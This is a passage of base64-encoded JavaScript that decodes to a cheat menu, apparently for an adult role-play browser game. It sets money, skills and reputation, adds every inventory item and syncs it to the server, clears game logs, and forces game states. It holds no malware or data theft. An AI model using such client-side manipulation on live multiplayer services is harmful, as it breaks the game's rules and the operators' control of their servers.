lzdGVuZXIoIm1vdXNlb3V0IiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiI7Cn0pOwoKYnV0dG9uMy5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZGRkZCI7CnRoaXMuc3R5bGUud2lkdGggPSAiMTkwcHgiOwp9KTsKYnV0dG9uMy5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW91dCIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIiOwp9KTsKCmJ1dHRvbjQuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdmVyIiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGRkZGQiOwp0aGlzLnN0eWxlLndpZHRoID0gIjE5MHB4IjsKfSk7CmJ1dHRvbjQuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdXQiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiIjsKfSk7CgpidXR0b241LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3ZlciIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkZGRkIjsKdGhpcy5zdHlsZS53aWR0aCA9ICIxOTBweCI7Cn0pOwpidXR0b241LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3V0IiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiI7Cn0pOwoKYnV0dG9uNi5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZGRkZCI7CnRoaXMuc3R5bGUud2lkdGggPSAiMTkwcHgiOwp9KTsKYnV0dG9uNi5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW91dCIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIiOwp9KTsKCmJ1dHRvbjcuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdmVyIiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGRkZGQiOwp0aGlzLnN0eWxlLndpZHRoID0gIjE5MC41cHgiOwp9KTsKYnV0dG9uNy5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW91dCIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIiOwp9KTsKCmJ1dHRvbjguYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdmVyIiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGRkZGQiOwp0aGlzLnN0eWxlLndpZHRoID0gIjE5MHB4IjsKfSk7CmJ1dHRvbjguYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdXQiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiIjsKfSk7CgpidXR0b245LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3ZlciIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkZGRkIjsKdGhpcy5zdHlsZS53aWR0aCA9ICIxOTBweCI7Cn0pOwpidXR0b245LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3V0IiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiI7Cn0pOwoKYnV0dG9uMTAuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdmVyIiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGRkZGQiOwp0aGlzLnN0eWxlLndpZHRoID0gIjE5MHB4IjsKfSk7CmJ1dHRvbjEwLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3V0IiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiI7Cn0pOwoKLy9Ecm9wZG93biBNZW51X19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fCgpmdW5jdGlvbiBmb3JjZWNsb3NlbWVudSgpIHsKICAgICAgY29udGV4dE1lbnUuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgICAgQ2hhdFJvb21DbGlja0NoYXJhY3RlcihQbGF5ZXIpOwogICAgICBEaWFsb2dMZWF2ZSgpOwogIGNvbnRleHRNZW51T3BlbiA9IGZhbHNlOwogIH0KCiAvLyBDcmVhdGUgdGhlIGRyb3Bkb3duIG1lbnUKdmFyIHNlbGVjdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNlbGVjdCIpOwpzZWxlY3Quc3R5bGUuYm9yZGVyUmFkaXVzID0gIjJweCI7CnNlbGVjdC5zdHlsZS5wYWRkaW5nID0gIjRweCI7CnNlbGVjdC5zdHlsZS53aWR0aCA9ICIyMDBweCI7CnNlbGVjdC5zdHlsZS5tYXJnaW5Ub3AgPSAiLTIwcHgiOwpzZWxlY3Quc3R5bGUubWFyZ2luUmlnaHQgPSAiMnB4IjsKc2VsZWN0LnN0eWxlLm1hcmdpbkJvdHRvbSA9ICIzcHgiOwpzZWxlY3Quc3R5bGUubWFyZ2luTGVmdCA9ICIycHgiOwp2YXIgb3B0aW9uMSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24xLnZhbHVlID0gIm9wdDEiOwpvcHRpb24xLnRleHQgPSAiUGVyc29uYWxpc2F0aW9uIE1lbnUiOwpvcHRpb24xLnNlbGVjdGVkID0gdHJ1ZTsKb3B0aW9uMS5kaXNhYmxlZCA9IHRydWU7CnZhciBvcHRpb24yID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjIudmFsdWUgPSAib3B0MiI7Cm9wdGlvbjIudGV4dCA9ICJFZGl0IENhc2giOwp2YXIgb3B0aW9uMyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24zLnZhbHVlID0gIm9wdDMiOwpvcHRpb24zLnRleHQgPSAiTWF4IFNraWxscyI7CnZhciBvcHRpb240ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjQudmFsdWUgPSAib3B0NCI7Cm9wdGlvbjQudGV4dCA9ICJNYXggUmVwdXRhdGlvbiI7CnZhciBvcHRpb241ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjUudmFsdWUgPSAib3B0NSI7Cm9wdGlvbjUudGV4dCA9ICJQdXJjaGFzZSBFdmVyeXRoaW5nIjsKdmFyIG9wdGlvbjYgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uNi52YWx1ZSA9ICJvcHQ2IjsKb3B0aW9uNi50ZXh0ID0gIlJlbGVhc2UgT3duZXIgQ29sbGFyIjsKdmFyIG9wdGlvbjcgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uNy52YWx1ZSA9ICJvcHQ3IjsKb3B0aW9uNy50ZXh0ID0gIisxIExBUlAgTGV2ZWwiOwp2YXIgb3B0aW9uOCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb244LnZhbHVlID0gIm9wdDgiOwpvcHRpb244LnRleHQgPSAiQmVjb21lIEVzY2FwZWQgUGF0aWVudCI7CnZhciBvcHRpb245ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjkudmFsdWUgPSAib3B0OSI7Cm9wdGlvbjkudGV4dCA9ICJCZWNvbWUgQ2x1YiBTbGF2ZSI7CnZhciBvcHRpb24xMCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24xMC52YWx1ZSA9ICJvcHQxMCI7Cm9wdGlvbjEwLnRleHQgPSAiUmVsZWFzZSBDbHViIFRpdGxlIjsKdmFyIG9wdGlvbjExID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjExLnZhbHVlID0gIm9wdDExIjsKb3B0aW9uMTEudGV4dCA9ICJTZXQgR0dUUyBMZXZlbCI7CnZhciBvcHRpb24xMiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24xMi52YWx1ZSA9ICJvcHQxMiI7Cm9wdGlvbjEyLnRleHQgPSAiU2V0IERvbS9TdWIgTGV2ZWwiOwp2YXIgb3B0aW9uMTMgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMTMudmFsdWUgPSAib3B0MTMiOwpvcHRpb24xMy50ZXh0ID0gIlNldCBOaWNrbmFtZSI7CnZhciBvcHRpb24xNCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24xNC52YWx1ZSA9ICJvcHQxNCI7Cm9wdGlvbjE0LnRleHQgPSAiRm9yY2UgT3JnYXNtIjsKdmFyIG9wdGlvbjE1ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjE1LnZhbHVlID0gIm9wdDE1IjsKb3B0aW9uMTUudGV4dCA9ICJCQ00gRGlzY29yZCI7CnZhciBvcHRpb24xNiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24xNi52YWx1ZSA9ICJvcHQxNiI7Cm9wdGlvbjE2LnRleHQgPSAiRm9yY2UgTG9iYnkiOwp2YXIgb3B0aW9uMTcgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMTcudmFsdWUgPSAib3B0MTciOwpvcHRpb24xNy50ZXh0ID0gIkxBUlAgT3B0aW9ucyI7CnZhciBvcHRpb24xOCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24xOC52YWx1ZSA9ICJvcHQxOCI7Cm9wdGlvbjE4LnRleHQgPSAiRW1vdGUgTWVudSAoYCArIEUpIjsKdmFyIG9wdGlvbjE5ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjE5LnZhbHVlID0gIm9wdDE5IjsKb3B0aW9uMTkudGV4dCA9ICJQZXJzaXN0YW50IFNldHRpbmdzIChgICsgUykiOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMSk7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb24yKTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjMpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uNCk7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb24xMik7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb241KTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjYpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uNyk7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb244KTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjkpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMTApOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMTEpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMTMpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMTQpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMTYpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMTcpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMTgpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMTkpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMTUpOwoKCgovLyBDcmVhdGUgYSBidXR0b24gdG8gc2hvdyB0aGUgZHJvcGRvd24gbWVudQp2YXIgZHJvcGRvd25CdXR0b24gPSBjcmVhdGVCdXR0b24oIlBlcnNvbmFsaXNhdGlvbiIsIGZ1bmN0aW9uKCkgewogIHNlbGVjdC5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsKfSk7Ci8vIENTUyB0byBtYWtlIHRoZSBidXR0b24gaW52aXNpYmxlIGFuZCB0YWtlIG5vIHNwYWNlCmRyb3Bkb3duQnV0dG9uLnN0eWxlLm9wYWNpdHkgPSAiMCI7CmRyb3Bkb3duQnV0dG9uLnN0eWxlLnBvaW50ZXJFdmVudHMgPSAibm9uZSI7CmRyb3Bkb3duQnV0dG9uLnN0eWxlLnBvc2l0aW9uID0gImFic29sdXRlIjsKZHJvcGRvd25CdXR0b24uc3R5bGUudG9wID0gIi05OTk5cHgiOwpkcm9wZG93bkJ1dHRvbi5zdHlsZS5sZWZ0ID0gIi05OTk5cHgiOwpzZWxlY3QuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBmdW5jdGlvbihldmVudCkgewogIGV2ZW50LnN0b3BQcm9wYWdhdGlvbigpOyAvLyBTdG9wIGV2ZW50IHByb3BhZ2F0aW9uCn0pOwoKc2VsZWN0LmFkZEV2ZW50TGlzdGVuZXIoImNoYW5nZSIsIGZ1bmN0aW9uKCkgewogIHZhciBzZWxlY3RlZE9wdGlvbiA9IHNlbGVjdC5vcHRpb25zW3NlbGVjdC5zZWxlY3RlZEluZGV4XS52YWx1ZTsKICBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQxIikgewogICAgLy8gUGVyZm9ybSBhY3Rpb24gZm9yIE9wdGlvbiAxCiAgICBqYXZhc2NyaXB0OlBsYXllci5Nb25leSA9IDk5OTk5OTkKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGV2ZW50LnN0b3BQcm9wYWdhdGlvbigpOwogICAgZXZlbnQuc3RvcFByb3BhZ2F0aW9uKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH0gZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQyIikgewogICAgLy8gUGVyZm9ybSBhY3Rpb24gZm9yIE9wdGlvbiAyCiAgICBqYXZhc2NyaXB0OlBsYXllci5Nb25leSA9IHByb21wdCgiRW50ZXIgQ2FzaCBBbW91bnQiKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfSBlbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDMiKSB7CiAgICAvLyBQZXJmb3JtIGFjdGlvbiBmb3IgT3B0aW9uIDMKICAgIGphdmFzY3JpcHQ6U2tpbGxDaGFuZ2UoIkluZmlsdHJhdGlvbiIsIDEwKTsKICAgIFNraWxsQ2hhbmdlKCJTZWxmQm9uZGFnZSIsIDEwKTsvL3NlbGYtdGllCiAgICBTa2lsbENoYW5nZSgiV2lsbHBvd2VyIiwgMTApOy8vUmVzaXN0IG9yZ2FzbXMKICAgIFNraWxsQ2hhbmdlKCJFdmFzaW9uIiwgMTApOy8vQmF0dGxlIHNraWxscwogICAgU2tpbGxDaGFuZ2UoIkJvbmRhZ2UiLCAxMCk7Ly9UaWUgb3RoZXJzCiAgICBTa2lsbENoYW5nZSgiRHJlc3NhZ2UiLCAxMCk7Ly9BQkRMCiAgICBTa2lsbENoYW5nZSgiTG9ja1BpY2tpbmciLCAxMCk7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH0gZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQ0IikgewogICAgLy8gUGVyZm9ybSBhY3Rpb24gZm9yIE9wdGlvbiA0CiAgICBqYXZhc2NyaXB0OlJlcHV0YXRpb25DaGFuZ2UoIkdhbWluZyIsIDEwMCk7Ly9BcmNhZGUgYW5kIEtpbmt5RHVuZ2VvbgogICAgUmVwdXRhdGlvbkNoYW5nZSgiR2FtYmxpbmciLCAxMDApOy8vR2FtYmxpbmcgcm9vbQogICAgUmVwdXRhdGlvbkNoYW5nZSgiTEFSUCIsIDEwMCk7CiAgICBSZXB1dGF0aW9uQ2hhbmdlKCJNYWlkIiwgMTAwKTsvL0NhbiBiZSBhIE1haWQKICAgIFJlcHV0YXRpb25DaGFuZ2UoIkFCREwiLCAxMDApOwogICAgUmVwdXRhdGlvbkNoYW5nZSgiTnVyc2UiLCAxMDApOy8vQ2FuIGJlIGEgTnVyc2UKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfSBlbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDUiKSB7CiAgICAvLyBQZXJmb3JtIGFjdGlvbiBmb3IgT3B0aW9uIDUKICAgIGphdmFzY3JpcHQ6U2VydmVyUGxheWVyU3luYwogICAgQXNzZXRGZW1hbGUzRENHLmZvckVhY2goZ3JvdXA9Pmdyb3VwLkFzc2V0LmZvckVhY2goaXRlbT0+SW52ZW50b3J5QWRkKFBsYXllciwgaXRlbS5OYW1lLCBncm91cC5Hcm91cCkpKTsKICAgIFNlcnZlclBsYXllckludmVudG9yeVN5bmMoKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfSBlbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDYiKSB7CiAgICAvLyBQZXJmb3JtIGFjdGlvbiBmb3IgT3B0aW9uIDYKICAgIGphdmFzY3JpcHQ6SW52ZW50b3J5UmVtb3ZlKFBsYXllciwgIkl0ZW1OZWNrIik7CiAgICBDaGF0Um9vbUNoYXJhY3Rlckl0ZW1VcGRhdGUoUGxheWVyLCAiSXRlbU5lY2siKTsKICAgIExvZ0FkZCgiUmVsZWFzZWRDb2xsYXIiLCAiT3duZXJSdWxlIik7IAogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9IGVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0NyIpIHsKICAgIC8vIFBlcmZvcm0gYWN0aW9uIGZvciBPcHRpb24gNwogICAgamF2YXNjcmlwdDphbGVydCgnU3RhcnQgYSBMQVJQIHNlc3Npb24gJiBzZWxlY3QgY2xhc3MgYmVmb3JlIHJ1bm5pbmcnKTsKICAgIEdhbWVMQVJQTGV2ZWxQcm9ncmVzcygxMDApIAogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9IGVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0OCIpIHsKICAgIC8vIFBlcmZvcm0gYWN0aW9uIGZvciBPcHRpb24gOAogICAgamF2YXNjcmlwdDpMb2dBZGQoIkVzY2FwZWQiLCAiQXN5bHVtIiwgQ3VycmVudFRpbWUgKyA5OTk5OTk5OTkpOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9IGVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0OSIpIHsKICAgIC8vIFBlcmZvcm0gYWN0aW9uIGZvciBPcHRpb24gOQogICAgamF2YXNjcmlwdDpMb2dBZGQoIkNsdWJTbGF2ZSIsICJNYW5hZ2VtZW50IiwgQ3VycmVudFRpbWUgKyA5OTk5OTk5OTkpOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9IGVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0MTAiKSB7CiAgICAvLyBQZXJmb3JtIGFjdGlvbiBmb3IgT3B0aW9uIDEwCiAgICBqYXZhc2NyaXB0OkxvZ0FkZCgiRXNjYXBlZCIsICJBc3lsdW0iLCBDdXJyZW50VGltZSk7CiAgICBMb2dBZGQoIkNsdWJTbGF2ZSIsICJNYW5hZ2VtZW50IiwgQ3VycmVudFRpbWUpOwogICAgTG9nQWRkKCJCbG9ja0NoYW5nZSIsICJSdWxlIiwgQ3VycmVudFRpbWUpOwogICAgTWFuYWdlbWVudElzQ2x1YlNsYXZlID0gZnVuY3Rpb24oKSB7CiAgICByZXR1cm4gZmFsc2UKICAgIH0KICAgIE1hbmFnZW1lbnRDbHViU2xhdmVEaWFsb2cgPSBmdW5jdGlvbihQbGF5ZXIpIHt9CiAgICBNYW5hZ2VtZW50RmluaXNoQ2x1YlNsYXZlKCkKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfSBlbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDExIikgewogICAgLy8gUGVyZm9ybSBhY3Rpb24gZm9yIE9wdGlvbiAxMQogICAgamF2YXNjcmlwdDphbGVydCgnU3RhcnQgYSBHR1RTIHNlc3Npb24gYmVmb3JlIHJ1bm5pbmcsIHJlZnJlc2ggdG8gc2VlIGNoYW5nZXMnKTsKICAgIFBsYXllci5HYW1lLkdHVFMuTGV2ZWwgPSBwcm9tcHQoIkVudGVyIEdHVFMgTGV2ZWwgKDEtNikiKTs7CiAgICBTZXJ2ZXJBY2NvdW50VXBkYXRlLlF1ZXVlRGF0YSh7CiAgICBHYW1lOiBQbGF5ZXIuR2FtZQogICAgfSk7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogICAgCiAgfWVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0MTIiKSB7CiAgICAvLyBQZXJmb3JtIGFjdGlvbiBmb3IgT3B0aW9uIDEyCiAgICBqYXZhc2NyaXB0OkRpYWxvZ1NldFJlcHV0YXRpb24oIkRvbWluYW50IiwgcHJvbXB0KCJFbnRlciBTdWIvRG9tIFJlcCAoLTEwMCB0byAxMDApIikpOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9ZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQxMyIpIHsKICAgIC8vIFBlcmZvcm0gYWN0aW9uIGZvciBPcHRpb24gMTMKICAgIGphdmFzY3JpcHQ6bmFtZSA9IHByb21wdCgiRW50ZXIgTmlja25hbWUiKTs7CiAgICBQbGF5ZXIuTmlja25hbWUgPSBuYW1lOwogICAgU2VydmVyQWNjb3VudFVwZGF0ZS5RdWV1ZURhdGEoeyBOaWNrbmFtZTogbmFtZSB9LCB0cnVlKTsgICAKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7ICAKICB9ZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQxNCIpIHsKICAgIC8vIFBlcmZvcm0gYWN0aW9uIGZvciBPcHRpb24gMTQKICAgIGphdmFzY3JpcHQ6QWN0aXZpdHlTZXRBcm91c2FsKFBsYXllciwgMSk7CiAgICBBY3Rpdml0eU9yZ2FzbVByZXBhcmUoUGxheWVyLCB0cnVlKTsKICAgIEFjdGl2aXR5T3JnYXNtR2FtZVJlc2lzdENvdW50ID0gMTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfWVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0MTUiKSB7CiAgICAvLyBQZXJmb3JtIGFjdGlvbiBmb3IgT3B0aW9uIDE1CiAgICBqYXZhc2NyaXB0OndpbmRvdy5vcGVuKCdodHRwczovL2Rpc2NvcmQuZ2cvdjNKQmp5UzRteCcsICdfYmxhbmsnKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfWVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0MTYiKSB7CiAgICAvLyBQZXJmb3JtIGFjdGlvbiBmb3IgT3B0aW9uIDE2CiAgICBqYXZhc2NyaXB0OihmdW5jdGlvbigpIHtsZXQgaW5wdXQgPSBwcm9tcHQoIk1hbGUgLyBGZW1hbGUgLyBNaXhlZCIpOwogICAgbGV0IHBsYWNlaG9sZGVyOwogICAgCiAgICBpZiAoaW5wdXQudG9Mb3dlckNhc2UoKSA9PT0gIm1hbGUiKSB7CiAgICAgIHBsYWNlaG9sZGVyID0gIk0iOwogICAgfSBlbHNlIGlmIChpbnB1dC50b0xvd2VyQ2FzZSgpID09PSAibWl4ZWQiKSB7CiAgICAgIHBsYWNlaG9sZGVyID0gIlgiOwogICAgfSBlbHNlIHsKICAgICAgcGxhY2Vob2xkZXIgPSAiIjsKICAgIH0gIAoKICAgIAogICAgQ2hhdFJvb21TdGFydChwbGFjZWhvbGRlciwgIiIsIG51bGwsIG51bGwsICJJbnRyb2R1Y3Rpb24iLCBCYWNrZ3JvdW5kc1RhZ0xpc3QpOwogIH0pKCk7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH1lbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDE3IikgewogICAgLy8gUGVyZm9ybSBhY3Rpb24gZm9yIE9wdGlvbiAxNwogICAgamF2YXNjcmlwdDooZnVuY3Rpb24oKSB7bGV0IGlucHV0ID0gcHJvbXB0KCJTdGFydCBhIExBUlAgUm9vbSBhcyBBZG1pbiBGaXJzdFxuU3RhcnQgLyBTa2lwIC8gTWl4ZWQgLyBTaHVmZmxlIC8gVGVhbSAvIFdpbiAoY29sb3IpIikudG9Mb3dlckNhc2UoKTsKCiAgICBpZiAoaW5wdXQgPT09ICJzdGFydCIpIHsKICAgICAgU2VydmVyU2VuZCgiQ2hhdFJvb21HYW1lIiwgeyBHYW1lUHJvZ3Jlc3M6ICJTdGFydCIgfSk7CiAgICB9IGVsc2UgaWYgKGlucHV0ID09PSAic2tpcCIpIHsKICAgICAgU2VydmVyU2VuZCgiQ2hhdFJvb21HYW1lIiwgeyBHYW1lUHJvZ3Jlc3M6ICJTa2lwIiB9KTsKICAgIH0gZWxzZSBpZiAoaW5wdXQgPT09ICJzaHVmZmxlIikgewogICAgICBTZXJ2ZXJTZW5kKCJDaGF0Um9vbUFkbWluIiwgeyBNZW1iZXJOdW1iZXI6IENoYXRSb29tQ2hhcmFjdGVyWzFdLk1lbWJlck51bWJlciwgQWN0aW9uOiAiU2h1ZmZsZSIgfSk7CiAgICB9IGVsc2UgaWYgKGlucHV0ID09PSAidGVhbSIpIHsKICAgICAgY29uc3QgRGljdGlvbmFyeSA9IG5ldyBEaWN0aW9uYXJ5QnVpbGRlcigpCiAgICAgIC5zb3VyY2VDaGFyYWN0ZXIoUGxheWVyKQogICAgICAuYnVpbGQoKTsKICAgIFNlcnZlclNlbmQoIkNoYXRSb29tQ2hhdCIsIHsgQ29udGVudDogIkxBUlBDaGFuZ2VUZWFtQ2xhc3MiLCBUeXBlOiAiQWN0aW9uIiwgRGljdGlvbmFyeTogRGljdGlvbmFyeSB9KTsKICB9IGVsc2UgaWYgKGlucHV0LnN0YXJ0c1dpdGgoIndpbiIpKSB7CiAgICAgIGxldCBjb2xvciA9IGlucHV0LnNsaWNlKDQpLnRyaW0oKTsKICAgICAgY29sb3IgPSBjb2xvci5jaGFyQXQoMCkudG9VcHBlckNhc2UoKSArIGNvbG9yLnNsaWNlKDEpOwogICAgICBHYW1lTEFSUEFkZENoYXRMb2coIkVuZEdhbWUiLCBQbGF5ZXIsIFBsYXllciwgT25saW5lR2FtZURpY3Rpb25hcnlUZXh0KCJUZWFtIiArIGNvbG9yKSwgMCwgMCwgIiMwMDAwQjAiKTsKICAgIH0KICB9KSgpOwoKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfWVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0MTgiKSB7CiAgICAvLyBQZXJmb3JtIGFjdGlvbiBmb3IgT3B0aW9uIDE4CiAgLy8gQ3JlYXRlIGFuZCBkaXNwbGF5IHRoZSBidXR0b24gY29udGFpbmVyCiAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChidXR0b25Db250YWluZXIpOwogIGJ1dHRvbkNvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsKICB9ZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQxOSIpIHsKICAgIC8vIFBlcmZvcm0gYWN0aW9uIGZvciBPcHRpb24gMTkKICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoc2V0dGluZ3NNZW51KTsKICAgIHNldHRpbmdzTWVudS5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfQogIAoKICAvLyBIaWRlIHRoZSBkcm9wZG93biBtZW51CiAgc2VsZWN0LnN0eWxlLmRpc3BsYXkgPSA